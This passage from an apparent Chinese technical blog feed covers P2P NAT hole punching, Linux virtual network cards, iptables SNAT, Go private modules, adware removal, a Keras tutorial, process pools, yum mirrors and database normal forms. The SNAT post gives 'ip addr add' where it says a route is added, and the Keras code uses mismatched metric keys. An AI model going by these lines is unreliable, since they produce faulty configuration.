和 客户端 B 能否建立 P2P 连接和各自所属 NAT 类型有关。\n1. 任意 NAT - (Full Cone NAT或Restricted Cone NAT) Full Cone NAT、Restricted Cone NAT和Port Restricted Cone NAT都有同样的映射规则：本地地址和端口不变时，映射到 NAT 上的端口不变。\n当一端位于 Full Cone NAT或Restricted Cone NAT 下，另一端为任意 NAT 时，通过以下方式可以建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据。对于 Restricted Cone NAT，由于NAT 网关2上还没有放开相应的过滤规则，因此前面客户端A发向客户端B的部分数据包会被丢失； 客户端 B 向客户端 A 的公网地址和端口发送数据，用以更新 NAT 网关2的过滤规则； 当NAT 网关2的过滤规则被刷新后，客户端 A 发向客户端B的数据便会被 NAT 网关2 接收，并转发给客户端 B； 接收数据时，客户端 B 就会知道客户端在 NAT 网关1上映射的端口和地址，此时客户端 B向NAT 网关1上映射的端口和地址发包，客户端A即可收到。此时客户端 A 和客户端 B 成功建立 P2P连接。 2. Easy NAT - Easy NAT Easy NAT 代指 RFC3489 所定义的 Full Cone NAT、Restricted Cone NAT、Port Restricted Cone NAT。\n当两端都位于 Easy NAT 下时，通过以下方式可以建立 P2P 连接（任意 NAT - (Full Cone NAT或Restricted Cone NAT) 流程类似）：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据，由于NAT 网关2上还没有放开相应的过滤规则，因此前面客户端A发向客户端B的部分数据包会被丢失； 客户端 B 向客户端 A 的公网地址和端口发送数据，用以更新 NAT 网关2的过滤规则； 当NAT 网关2的过滤规则被刷新后，客户端 A 发向客户端B的数据便会被 NAT 网关2 接收，并转发给客户端 B； 接收数据时，客户端 B 就会知道客户端在 NAT 网关1上映射的端口和地址，此时客户端 B向NAT 网关1上映射的端口和地址发包，客户端A即可收到。此时客户端 A 和客户端 B 成功建立 P2P连接。 3. Symmetric NAT - Port Restricted Cone NAT 当客户端 A 位于 Symmetric NAT 下，客户端 B 位于 Port Restricted Cone NAT 时，通过以下方式可以建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据。由于 NAT 网关2 没有放开相应的过滤规则，因此客户端 A 发往客户端 B 的数据包会被 NAT 网关2拦截，无法到达客户端 B；； 由于客户端 A 在NAT 网关1上映射的端点(IP:Port 中 Port 未知)，因此客户端 B 无法向一个明确的端点发送数据包来更新 NAT 网关2 过滤规则。 此时就需要通过以下几种方案来让碰撞，让客户端 A 发向客户端 B 的包顺利通过 NAT 网关2。\n全端口开放\n虽然我们不知道客户端 A 在映射NAT 网关1上映射的端口是多少，但是我们知道，他映射的端口一定是 1024 - 65535 内其中一个，并且一定不是 A 连接中心服务器时使用的端口。\n我们可以顺序构造目的端口为 1024 - 65535 的短 TTL 包（短 TTL 包可以让包不走到公网，仅仅用于打开防火墙规则，以免被识别为 Dos 攻击），让 NAT 网关2 开放所有可能端口（相当于将 Port Restricted Cone NAT 变为 Restricted Cone NAT）。\n但是经过实际测试发现该方法效果不佳，主要有以下原因：\n需要构造大量数据包：平均需要发包 32256 个包 才能碰撞到 客户端 A 在 NAT 网关1上映射的端口。假设客户端 B 的发包速率为 100 p/s，那么就需要五分半才能碰撞到端口； 容易触发运营商 QoS 限制：经过实际测试，发现一定时间内无效数据包过多时，运营商会对客户端 B 的包进行大量丢弃，导致丢包率上升。严重情况下运营商会直接全部丢弃客户端 B 的数据包。 端口预测\n在部分 NAT 上，端口映射具有一定规律 。\n比如发往目的 IP 1 时，映射的端口为 22001；发往目的 IP 2 时，映射的端口为 22002；那么我们可以猜测，发往目的 IP 3时使用的端口可能为 22003。\n使用此种方案，需要客户端 A 向多个服务器请求来确认自身映射端口，从这些映射的端口中找到可能存在的端口变化规律。\n此种方法具有一定可行性，但和 NAT 行为有关，不是一个通用解决方案。\n生日攻击\n在前面的“全端口开放”方法中，客户端 A 只在 NAT 网关1 上映射了一个端口。但是实际情况下，客户端 A 可以在 NAT 网关1 上映射多个端口。\n根据概率论的 生日悖论，可以写发现客户端 A 映射的端口、客户端 B 发包数量与成功概率之间的关系，公式如下所示：\n$$ \\begin{array}{c} P_{success} = 1 - \\frac{C_{64,512}^{ports} \\times C_{64,512-ports}^{packets }}{C_{64,512}^{ports} \\times C_{64,512}^{packets}} \\end{array} $$ 根据上面的公式绘制出三维图如图所示： 根据函数图我们可以发现，当客户端 A 映射在公网上的端口越多时，建立连接所需的发包数越少，下表中列举了部分数据：\n使用端口数\\发包数 50% 80% 90% 99% 10 4320 9590 13268 23807 50 888 2043 2903 5675 100 446 1030 1468 2902 200 223 517 738 1467 300 149 345 493 981 根据表中数据可以发现：假设客户端 A 占用100个端口，客户端 B 以 100 p/s 的速度进行探测，那么要达到50%的概率仅需 6s，达到 99% 也只需 29s！\n根据上面的数据分析可以发现生日攻击是在 Symmetric NAT - Port Restricted Cone NAT 进行 P2P 打洞时一个较为优秀的方案。\n4. Symmetric NAT - Symmetric NAT 当两端都是 Symmetric NAT 时，复杂度比 Symmetric NAT - Port Restricted Cone NAT 有了成倍的增长。\n假设使用上面的“全端口开发”方案，那么就需要发包 4,161,798,144 次，耗费时间需要一年以上；\n即使是使用“生日攻击”方案，一端打开 256 个端口，要达到 50% 的概率需要 54,000 次发包，按照 100 p/s 的发包速率需要9分钟；达到 99% 的成功率需要 170,000 次发包，时间上需要30分钟左右。\n即使时间上可以忍受，但 NAT 网关却无法忍受这么多次的发包行为。因为每发一次包，就需要在 NAT 的 session 表上记录一条，想创建一条成功的连接，大部分情况下都会打爆 NAT 的session 表。\n因此对于 Symmetric NAT - Symmetric NAT 网络类型，连接建立方案只能选择中继服务器模式。\n五、客户端位于同一大 NAT 下，但不属于同一内网 在当前网络模型中，客户端 A 和客户端 B 位于同一任意大 NAT 后，但是分属于大 NAT 下的两个小子网中。客户端 A 和 客户端 B 需要通过以下步骤建立连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 的公网地址和自身相同，猜测 B 可能与自己位于同一内网中，于是 A 尝试直接向 B 发起连接。但是由于 A 和 B不在同一内网中，因此连接建立失败。客户端 A 通过中心服务器通知 B 连接建立失败，需要进行下一步尝试； 客户端 A 向 B 暴露的公网 IP 和端口直接发送请求。如果NAT 网关不支持 Hairpin 模式，那么这个数据包会被直接丢弃，导致数据包无法到达 NAT 网关2；如果 NAT 网关开启了 Hairpin 模式，A 发向 B 的流量会被 NAT 网关转发给 NAT 网关2，流程进入下一步； 当数据包到达 NAT 网关2后，下面的流程就和 “客户端分属与不同NAT下”时的打洞行为一致了。 六、多层 NAT 在网络中，存在设备在多层NAT后的情况。\n对于这种多层NAT而言，真正有影响的是最靠近公网的那一个 NAT 网关，其余的 NAT 对于客户端和服务端来说都是不可见的，连接不会关心到底经过了多少层NAT。\n但是多层 NAT 并非完全没有影响，准确来说，多层NAT 影响的是客户端的端口映射行为。客户端发出的端口映射请求，只有最靠近客户端的那层 NAT 设备会做出响应。其他的NAT设备不会收到客户端的端口映射请求。但是端口映射要产生作用的话，需要的是最靠近公网的 NAT 网关执行端口映射才行。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%B8%8D%E5%90%8C%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%B8%8B%E5%BB%BA%E7%AB%8B-p2p-%E8%BF%9E%E6%8E%A5/","title":"不同网络模型下建立 P2P 连接"},{"content":"常见虚拟网卡 lo lo 网卡是 Linux 中默认就会存在的一张虚拟网卡。它的默认 IP 为 127.0.0.1。\nlo 网卡用于本地网络访问，数据包无需离开本机网络。lo 网卡的默认 MTU 为 65535，使用 lo 网卡进行传输数据速度会比用物理网卡传输快的多。不同进程间可通过 lo 网卡进行跨进程通信。\ntap/tun tap/tun 是 Linux 内核 2.4.x 版本之后实现的虚拟网络设备。\n用户态进程可通过读写 tap/tun 字符设备文件来读取系统网络栈发往 tap/tun 网卡的数据包和写入数据包到系统网络栈。\ntap 和 tun 网卡具有以下区别：\ntun 网卡对应的字符设备文件为：/dev/net/tun，tun 网卡提供了对 IP 层的解包封包能力； tap 网卡对应的字符设备文件为：/dev/tap0，提供了对数据链路层的解包封包能力，可以将 tap 设备看作去除了物理层的以太网网卡。 tap/tun 网卡由于其工作机制，常被用来作为 VPN 等隧道通信。\nveth-pair veth-pair 就是一对的虚拟设备接口，和 tap/tun 设备不同的是，它都是成对出现的。一端连着协议栈，一端彼此相连着。\n发往 veth0 的数据包会被直接拷贝到 veth1 网卡。因为其点对点特性，因此 veth 网卡常用于虚拟化网络间的通信，如容器和虚拟机等。\nbridge 同 tap/tun、veth-pair 一样，Bridge 也是一种虚拟网络设备，所以具备虚拟网络设备的所有特性，比如可以配置 IP、MAC 等。\n除此之外，对于普通的网络设备，只有两端，数据从一端进，从另一端出。但是 Bridge 设备具有多个端口，数据可以从多个端口进，从多个端口出。因此 Bridge 还是一个交换机，具有交换机所有的功能。\n可以将多个网卡连接到 bridge 网卡，从而实现交换机的能力。给 bridge 网卡配置上 NAT 规则，还可以让 bridge 由交换机转变为路由器。\nbond bond 同样也是一个虚拟网卡，bond 网卡能够将多个物理网卡组合为逻辑上的一个虚拟网卡，拥有单个 IP 和 MAC。\nbond 网卡具有七种模式，常用的模式为平衡负载模式和冗余模式：\n平衡负载模式能够从多张网卡接收数据和，和将数据包根据负载均衡策略发往多个物理网卡； 冗余模式能够在在单张网卡出现故障时自动切换到另外一张网卡去。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%B8%B8%E8%A7%81%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1/","title":"常见虚拟网卡"},{"content":"单网卡多IP网段代理 效果图 实现效果：OS-A 通过 OS-B 能够访问 OS-C 。\n实现步骤 OS-A 需要添加路由，将 192.168.1.0/24 网段的流量发送到 OS-B\n1 ip addr add 192.168.1.0/24 dev eth0 OS-B 需要开启数据包转发的能力，并且设置 SNAT，将收到的 192.168.1.0/2 的源 IP 换为 192.168.1.22：\n1 2 3 4 5 6 # 开启包转发能力 sysctl -w net.ipv4.ip_forward=1 sysctl -p /etc/sysctl.conf # 添加 SNAT iptables -t nat -A POSTROUTING -d 192.168.1.0/24 -j SNAT --to-source 192.168.1.22 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%8D%95%E7%BD%91%E5%8D%A1%E5%A4%9Aip%E7%BD%91%E6%AE%B5%E4%BB%A3%E7%90%86/","title":"单网卡多IP网段代理"},{"content":"导入私有仓库包 1 2 3 4 5 6 7 8 # 设置GOPRIVATE go env -w GOPRIVATE=git.xxx.com # 设置GOINSECURE go env -w GOINSECURE=git.xxx.com # 允许使用终端输入 git 账户名密码 export GIT_TERMINAL_PROMPT=1 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%AF%BC%E5%85%A5%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E5%8C%85/","title":"导入私有仓库包"},{"content":"电脑下载到流氓软件后怎么办？超详细教学！ 前言 自己作为一个热爱计算机的男孩子，经常会遇到妹子电脑中毒来让自己帮忙处理的事情。可谓是阅女。。。呸！阅电脑无数。 大多数的妹子在计算机这个世界里都是小白一枚。经常性会遇到妹子的电脑里装了 5个解压软件！6个浏览器！！2345全套！！！ 。电脑卡的都快吐了，妹子还觉得电脑用着还行。。。 因此自己花了一点时间总结了一下自己处理的一些经验，供大家参考参考。有操作不当之处，或者有其它好办法的话欢迎大家在评论区留言，自己会及时更正的。 谢谢！\n电脑中毒的表现 当自己运行了某个不知名软件后，电脑桌面新增大量新的应用图标，出现大量弹窗广告，电脑反应明显卡顿，这个时候十分明确的可以告诉你，你的电脑已经被流氓软件入侵了，简单的说就是你电脑中毒了！\n刚中毒的电脑处理流程 第一步：关电脑 当我们发现上述情况后，应该立即关闭电脑。\n如果说电脑卡死没法关机，这个时候可以采取长按电源键强制关机的方式关闭电脑，不过一般不建议采用此方法关闭电脑，因为对操作系统和软件数据可能会有损毁、丢失的问题。\n只要电脑关机了，再厉害的流氓软件也没辙了。\n我们关闭电脑的主要目的是 终止流氓软件继续在我们的电脑下载其它的软件。\n如果不及时关闭电脑，会给后续的清理工作带来极大的困难。\n第二步：重启电脑下载软件 等电脑顺利关机之后，我们就需要重启电脑。\n重启电脑后直接点开浏览器下载这两个软件：Revo Uninstaller 和 火绒安全软件 。\n下载完成之后立即关闭网络链接，避免流氓软件继续下载其它软件。\n我们剩下的工作就是瓮中捉鳖了，我们需要对已经下载的流氓软件进行清理。\n第三步：清理弹窗 首先安装我们刚刚下载的两个软件。这一步我们使用的是 Revo Uninstaller。 打开软件，点击上方的猎人模式： 点击之后会在桌面出现这样一个靶子一样的图标，接下来我们就可以拖到这个靶子去一个一个杀死那些流氓软件了。 拖动图标到这个弹窗上，会弹出一个下拉框，我们点击终止并杀死进程： 弹出该提示框，选择是： 这样我们就把这些该死的弹窗广告的进程全部清理了。\n第四步：卸载软件 这一步我们依然使用的是 Revo Uninstaller 。\n打开主程序框，选择按时间排序，找到分界点： 上面所有的软件我们都需要进行卸载。\n找到软件，选择进行卸载： 这些流氓软件我们不需要创建系统还原点，因此这里我们取消勾选： 默认情况下我们选择温和就行了，如果时间比较充裕，想和妹子多说点话。。。呸！想帮妹子清理干净，我们就可以选择高级。选择高级的话速度可能比较慢，清理的时间可能用的多一点。 扫描之后就需要进行清理注册表了，此处我们选择全选然后进行删除： 残余文件及文件夹依然是全选加删除： 这一套操作下来才算是完完全全卸载干净了一个软件。 其余的软件重复上述操作就行。\n第五步：扫尾 流氓软件都卸载之后我们就可以重新连接网络了，然后打开我们下载好的 火绒安全软件。 选择全盘查杀（需要花费很长的时间）或者快速查杀（时间较短）。 第六步：重启 查杀完成之后关机重启，打开之后又是一台干干净净的电脑了。\n病入膏肓的电脑处理流程 对于那些电脑中毒很久的电脑，可以按照下面的流程进行处理：\n第一步：下载软件 下载 Process Explorer 和 火绒安全软件 。\n第二步：查找进程 打开 Process Explorer ，找到这个靶子一样的图标： 将它拖动到弹窗上： Process Explorer 会自动为我们定位到运行该弹窗的进程： 第三步：找到文件位置并杀死进程 找到弹窗广告的进程，右键，点击属性： 打开程序所在文件夹： 最后查找到该程序的根目录： 再回到 Process Explorer 杀死进程，如果是单进程就选择 Kill Process，如果是多层进程就选择 Kill Process Tree： 第四步：删除文件 打开火绒安全软件，找到文件粉碎： 选择添加文件夹： 找到对应的文件夹： 勾选上彻底粉碎，然后开始粉碎（可能会遇到文件无法删除的情况，解决方法较多，可以自行百度解决）： 第五步：扫尾 打开火绒安全，选择扫描病毒和系统清理功能对整个系统进行一次扫描。\n一些建议 选择官网下载文件 当我们需要下载文件时，选择后面带有 官网 字样的网站进行下载。 Win10正常使用没必要安装杀毒软件 Windows 以前的版本因为漏洞比较多饱受诟病，因此电脑需要安装一些杀毒软件防止电脑被病毒入侵。\n但是 Win10 自带有安全中心，可以拦截大部分病毒。因此我们完全不用自己再另外安装杀毒软件。自己安装的杀毒软件还会拖累电脑性能。 推介几个好用的软件 解压缩 7-zip Bandzip 这两款软件都是免费无广告的，并且其功能强大体积小巧，强烈推荐！\n浏览器 谷歌 火狐 Edge（Win10自带） 解锁文件占用进程 在删除文件时，会遇到有进程正在运行无法删除的情况。使用 LockHunter 即可找出导致无法删除的进程。结束进程之后即可删除文件。\n软件下载地址汇总（点击即可跳转官网下载） Revo Uninstaller 火绒安全软件 Process Explorer\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%94%B5%E8%84%91%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%B5%81%E6%B0%93%E8%BD%AF%E4%BB%B6%E5%90%8E%E6%80%8E%E4%B9%88%E5%8A%9E%E8%B6%85%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/","title":"电脑下载到流氓软件后怎么办？超详细教学！"},{"content":"电影评论分类：二分类问题 简介 本例出自《Python 深度学习》，自己做了一个简单的总结归纳。\n完整代码请参考：https://github.com/fchollet/deep-learning-with-python-notebooks\n主要流程 数据预处理 graph LR A[原始评论] --\u0026gt; |关键词分割|C[建立关键词索引] C --\u0026gt; |将关键词转索引|D[原始评论转向量] D --\u0026gt; 列表编码为二进制矩阵 graph LR 原始评论标签 --\u0026gt; 二制化标签 训练模型 graph LR A1(第一层:16个输出单元) --\u0026gt; A[构建模型] A2(第二层:16个输出单元) --\u0026gt; A A3(第三层:1个输出单元) --\u0026gt; A A ==\u0026gt; B[编译模型] B1(配置优化器和损失函数) --\u0026gt; B B ==\u0026gt; C[加入验证集训练模型] C ==\u0026gt; D[绘制图表观察模型最佳参数] D1[欠拟合与过拟合之间] --\u0026gt; D D ==\u0026gt; E[选择最佳参数训练模型] E ==\u0026gt; F[在新数据上使用模型] 代码 加载数据集 注意：第一次加载会下载文件，速度较慢\n1 2 3 4 from keras.datasets import imdb # 加载 IMDB 数据集 (train_data, train_labels), (test_data, test_labels) = imdb.load_data(num_words=10000) # 取一万个词 整数序列转二进制矩阵 1 2 3 4 5 6 7 8 9 10 11 12 import numpy as np # 将整数序列编码为二进制矩阵 def vectorize_sequences(sequences, dimension=10000): print((len(sequences), dimension)) results = np.zeros((len(sequences), dimension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return results x_train = vectorize_sequences(train_data) x_test = vectorize_sequences(test_data) 向量标签化 1 2 3 # 标签向量化 y_train = np.asarray(train_labels).astype(\u0026#39;float32\u0026#39;) # int64转float32 y_test = np.asarray(test_labels).astype(\u0026#39;float32\u0026#39;) 构建模型 1 2 3 4 5 6 7 8 9 10 11 # 构建网络 from keras import layers from keras import models model = models.Sequential() # 第一层，16个隐藏单元，激活函数为relu model.add(layers.Dense(16, activation=\u0026#39;relu\u0026#39;, input_shape=(10000, ))) # 第二层，16个隐藏单元，激活函数为relu model.add((layers.Dense(16, activation=\u0026#39;relu\u0026#39;))) # 第三层，输出一个标量（预测结果），激活函数为sigmoid model.add(layers.Dense(1, activation=\u0026#39;sigmoid\u0026#39;)) 编译模型 1 2 3 4 5 # 编译模型 # 优化器：rmsprop # 损失函数：binary_crossentropy（仅包含一个单元的模型可以采用，替代方案：mean_squared_error） # 指标：精确 model.compile(optimizer=\u0026#39;rmsprop\u0026#39;, loss=\u0026#39;binary_crossentropy\u0026#39;, metrics=[\u0026#39;accuracy\u0026#39;]) 加入验证集训练模型 1 2 3 4 5 6 7 8 9 # 留出验证集 x_val = x_train[:10000] partial_x_train = x_train[10000:] y_val = y_train[:10000] partial_y_train = y_train[10000:] # 训练模型 history = model.fit(partial_x_train, partial_y_train, epochs=20, batch_size=512, validation_data=(x_val, y_val)) 绘制图表观察训练过程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 history_dict = history.history # 绘制训练损失和验证损失 import matplotlib.pyplot as plt loss = history.history[\u0026#39;loss\u0026#39;] val_loss = history.history[\u0026#39;val_loss\u0026#39;] epochs = range(1, len(loss) + 1) plt.plot(epochs, loss, \u0026#39;bo\u0026#39;, label=\u0026#39;Training loss\u0026#39;) plt.plot(epochs, val_loss, \u0026#39;b\u0026#39;, label=\u0026#39;Validation\u0026#39;) plt.title(\u0026#39;Training and validation loss\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Loss\u0026#39;) plt.legend() plt.show() # 绘制训练精度和验证精度 plt.clf() # 清空图像 acc = history.history[\u0026#39;accuracy\u0026#39;] val_acc = history.history[\u0026#39;val_accuracy\u0026#39;] plt.plot(epochs, acc, \u0026#39;bo\u0026#39;, label=\u0026#39;Training acc\u0026#39;) plt.plot(epochs, val_acc, \u0026#39;b\u0026#39;, label=\u0026#39;Validation acc\u0026#39;) plt.title(\u0026#39;Training and validation accuracy\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Accuracy\u0026#39;) plt.legend() plt.show() 训练模型 1 2 # 通过上面的图表发现模型在第四轮之后出现过拟合现象，因此我们选择训练轮数为4 model.fit(x_train, y_train, epochs=4, batch_size=512) 对新数据进行预测 1 2 result = model.predict(x_test) # [0.2930210903453827, 0.8831999897956848] 绘制图表 训练损失和验证损失\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 绘制训练损失和验证损失 import matplotlib.pyplot as plt loss = history.history[\u0026#39;loss\u0026#39;] val_loss = history.history[\u0026#39;val_loss\u0026#39;] epochs = range(1, len(loss) + 1) plt.plot(epochs, loss, \u0026#39;bo\u0026#39;, label=\u0026#39;Training loss\u0026#39;) plt.plot(epochs, val_loss, \u0026#39;b\u0026#39;, label=\u0026#39;Validation\u0026#39;) plt.title(\u0026#39;Training and validation loss\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Loss\u0026#39;) plt.legend() plt.show() 训练精度和验证精度\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 绘制训练精度和验证精度 plt.clf() # 清空图像 acc = history.history[\u0026#39;binary_accuracy\u0026#39;] val_acc = history.history[\u0026#39;val_binary_accuracy\u0026#39;] plt.plot(epochs, acc, \u0026#39;bo\u0026#39;, label=\u0026#39;Training acc\u0026#39;) plt.plot(epochs, val_acc, \u0026#39;b\u0026#39;, label=\u0026#39;Validation acc\u0026#39;) plt.title(\u0026#39;Training and validation accuracy\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Accuracy\u0026#39;) plt.legend() plt.show() 总结 通常需要对原始数据进行大量预处理，以便将其转换为张量输入到神经网络中。单词序列可以编码为二进制向量，但也有其他编码方式。 带有relu激活的Dense层堆叠，可以解决很多种问题（包括情感分类），你可能会经常用到这种模型。 对于二分类问题（两个输出类别），网络的最后一层应该是只有一个单元并使用sigmoid激活的Dense层，网络输出应该是0~1范围内的标量，表示概率值。 对于二分类问题的sigmoid标量输出，你应该使用binary_crossentropy损失函数。 无论你的问题是什么，rmsprop优化器通常都是足够好的选择。这一点你无须担心。 随着神经网络在训练数据上的表现越来越好，模型最终会过拟合，并在前所未见的数据上得到越来越差的结果。一定要一直监控模型在训练集之外的数据上的性能。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%94%B5%E5%BD%B1%E8%AF%84%E8%AE%BA%E5%88%86%E7%B1%BB%E4%BA%8C%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98/","title":"电影评论分类：二分类问题"},{"content":"多进程发生内存溢出的解决办法 前言 昨天在编写一个多进程程序时，由于自己考虑不周，程序在启动后发生了内存溢出的故障。导致自己的程序卡死崩溃，电脑也陷入了死机黑屏的状态。见识到内存溢出的巨大威害后，觉得自己有必要好好了解一下编写多进程程序时的注意事项，特进行一个总结。\nBug复现 下面的这个程序是自己抽象简化后的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import multiprocessing import time from random import randint def func(): flag = randint(0, 1) if flag: time.sleep(2) if __name__ == \u0026#39;__main__\u0026#39;: for _ in range(256): process = multiprocessing.Process(target=func) process.start() 抽象化后的程序主体就是这样子的，目标函数会由于情况的不同而选择立即退出或者说等待两秒再退出。\n由于需要创建的进程可能会出现两秒的延时，当出现延时的进程十分多的时候就会发生内存溢出的惨案！\n解决办法 1. 等待进程运行完毕 既然造成内存溢出的原因是同时运行的进程太多了，那我们就等待一个进程运行完后再运行另外一个进程不久行了吗？\n1 2 3 4 5 6 7 8 9 10 11 def func(): flag = randint(0, 1) if flag: time.sleep(2) if __name__ == \u0026#39;__main__\u0026#39;: for _ in range(256): process = multiprocessing.Process(target=func) process.start() process.join() # 等待进程运行退出 不过这样子和不使用多进程有什么区别吗。。。。真是一个睿（ruo）智的办法！\n2. 创建进程池 我们限制一个最大进程数，只要开的进程数小于这个最大进程数，我们就为新任务创建进程，如果开的进程数大于等于了这个最大进程数，我们就让后面的新任务等待前面的任务完成之后再为他创建进程。\n这样就能保证我们不会同时创建太多的进程，也就不会导致内存溢出的Bug了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import multiprocessing import time from random import randint def func(): flag = randint(0, 1) if flag: time.sleep(2) if __name__ == \u0026#39;__main__\u0026#39;: pool = multiprocessing.Pool(multiprocessing.cpu_count()) # 设置进程池最大进程数为电脑CPU数量 for _ in range(256): pool.apply_async(func) pool.close() pool.join() 这才真的是一个睿智的办法！\n注意事项 创建多进程时一定要注意任务里有没有会阻塞进程的事件，如果有，一定要给他加一个超时机制！\n一定要限制程序创建的最大进程数！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\u0026#34; . \u0026#34;88 // // (| ^_^ |) // // O\\ = /O // // ____/`---\u0026#39;\\____ // // .\u0026#39; \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| \u0026#39;\u0026#39;\\---/\u0026#39;\u0026#39; | | // // \\ .-\\__ `-` ___/-. / // // ___`. .\u0026#39; /--.--\\ `. . ___ // // .\u0026#34;\u0026#34; \u0026#39;\u0026lt; `.___\\_\u0026lt;|\u0026gt;_/___.\u0026#39; \u0026gt;\u0026#39;\u0026#34;\u0026#34;. // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-\u0026#39;======== // // `=---=\u0026#39; // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%94%9F%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","title":"多进程发生内存溢出的解决办法"},{"content":"服务热重载实现思路 热重启（平滑重启、热修复）是指在不中断已有请求的状态下对服务进行重启。例如 nginx 在不断开连接的情况下重新加载新配置，微服务在不断业务的情况下完成热升级，这些都是热重启的一些应用。\n在 Linux 服务器上实现热重启主要有以下两种方式：覆盖模式和管理者模式。\n覆盖模式 该模式下，父进程会 fork 出子进程，将自身占有的文件资源交给子进程，子进程创建完成后通知父进程退出并开始接收新的连接，父进程收到通知后就不再接收新的连接，将当前连接处理完成后父进程就会退出，子进程此时就代替了父进程成为新的服务程序。流程图如下所示： 管理者模式 在管理者模式下，服务进程是管理进程的子进程，当收到热重启信号时，控制进程会通知当前服务进程退出，当前服务进程会处理当前未处理完的连接，处理完成后进程退出。控制进程会新建一个子进程，子进程会来处理新的连接。 总结 两种模式都能够实现热重启，但是两种模式会有一定的差异。第一种方式下重载后进程 PID 会发生改变，第二种有无父进程未销毁因此 PID 不会发生修改。\n相较而言，第一种方式更适合单服务的情况，第二种更适合多服务的情况。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%9C%8D%E5%8A%A1%E7%83%AD%E9%87%8D%E8%BD%BD%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF/","title":"服务热重载实现思路"},{"content":"更换 yum 源为阿里源 目标：更换 yum 源为阿里源\n系统：Centos 7.9\n步骤 1. 备份旧的配置文件 1 2 cd /etc/yum.repos.d/ # 进入文件夹 mv CentOS-Base.repo CentOS-Base.repo_back\t# 备份原始配置文件 2. 下载阿里源的文件 1 2 3 wget -O CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 若没有 wget 可使用 curl curl -o CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 3. 安装 epel repo 源 1 2 3 wget -O epel.repo http://mirrors.aliyun.com/repo/epel-7.repo # 若没有 wget 可使用 curl curl -o epel.repo http://mirrors.aliyun.com/repo/epel-7.repo 4. 清理缓存 1 yum clean all 5. 重新生成缓存 1 yum makecache 6. 更新 1 yum -y update ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%9B%B4%E6%8D%A2-yum-%E6%BA%90%E4%B8%BA%E9%98%BF%E9%87%8C%E6%BA%90/","title":"更换 yum 源为阿里源"},{"content":"关系型数据库三范式 简介 为了设计出合理的关系型数据库，人们在多年来的摸索中，总结了合理关系型数据库的共同之处。为了让后人设计的数据库都能够较为合理，大家就把这些共同点变成规则。 这些不同的规范要求被称为不同的范式，各种范式呈递次规范。\n越高的范式数据库冗余越小\n第一范式 属性的原子性 第一范式（1NF）是指数据库表的每一列都是不可分割的基本数据项，同一列中不能有多个值。 